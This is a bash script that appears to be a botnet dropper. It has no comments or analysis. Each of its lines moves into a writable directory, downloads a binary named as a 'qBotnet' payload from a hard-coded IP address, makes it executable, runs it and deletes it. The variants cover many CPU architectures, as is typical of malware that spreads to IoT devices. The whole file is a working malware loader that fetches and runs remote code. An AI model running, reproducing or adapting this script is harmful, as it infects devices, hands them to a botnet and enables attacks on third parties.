#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/m-i.p-s.qBotnet; chmod +x m-i.p-s.qBotnet; ./m-i.p-s.qBotnet; rm -rf m-i.p-s.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/m-p.s-l.qBotnet; chmod +x m-p.s-l.qBotnet; ./m-p.s-l.qBotnet; rm -rf m-p.s-l.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/s-h.4-.qBotnet; chmod +x s-h.4-.qBotnet; ./s-h.4-.qBotnet; rm -rf s-h.4-.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/x-8.6-.qBotnet; chmod +x x-8.6-.qBotnet; ./x-8.6-.qBotnet; rm -rf x-8.6-.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/a-r.m-6.qBotnet; chmod +x a-r.m-6.qBotnet; ./a-r.m-6.qBotnet; rm -rf a-r.m-6.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/x-3.2-.qBotnet; chmod +x x-3.2-.qBotnet; ./x-3.2-.qBotnet; rm -rf x-3.2-.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/a-r.m-7.qBotnet; chmod +x a-r.m-7.qBotnet; ./a-r.m-7.qBotnet; rm -rf a-r.m-7.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/p-p.c-.qBotnet; chmod +x p-p.c-.qBotnet; ./p-p.c-.qBotnet; rm -rf p-p.c-.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/i-5.8-6.qBotnet; chmod +x i-5.8-6.qBotnet; ./i-5.8-6.qBotnet; rm -rf i-5.8-6.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/m-6.8-k.qBotnet; chmod +x m-6.8-k.qBotnet; ./m-6.8-k.qBotnet; rm -rf m-6.8-k.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/p-p.c-.qBotnet; chmod +x p-p.c-.qBotnet; ./p-p.c-.qBotnet; rm -rf p-p.c-.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/a-r.m-4.qBotnet; chmod +x a-r.m-4.qBotnet; ./a-r.m-4.qBotnet; rm -rf a-r.m-4.qBotnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.134/a-r.m-5.qBotnet; chmod +x a-r.m-5.qBotnet; ./a-r.m-5.qBotnet; rm -rf a-r.m-5.qBotnet
